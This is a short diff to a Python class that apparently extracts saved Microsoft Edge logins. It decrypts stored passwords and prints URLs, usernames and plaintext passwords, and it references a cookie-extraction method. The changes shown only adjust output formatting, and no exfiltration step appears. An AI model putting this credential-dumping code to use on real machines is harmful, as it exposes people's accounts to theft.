@@ -87,7 +87,8 @@ class MicrosoftEdge:
                                 creation = self.edge_date_time(login[3])
                                 if (url != "" and username != "" and ciphertext != ""):
                                     decrypted_pass = self.decrypt_password(ciphertext, encrypted_key)
-                                    message = f"URL: {url}\n"
+                                    message = str(index) + " " + ("=" * 50+"\n")
+                                    message += f"URL: {url}\n"
                                     message += f"Username: {username}\n"
                                     message += f"Password: {decrypted_pass}\n"
                                     message += f"Creation date: {creation}\n\n"
@@ -277,5 +278,5 @@ class MicrosoftEdge:
             return e      
                 
 edge_browser = MicrosoftEdge()
-# print(edge_browser.get_edge_cookies())
+
 
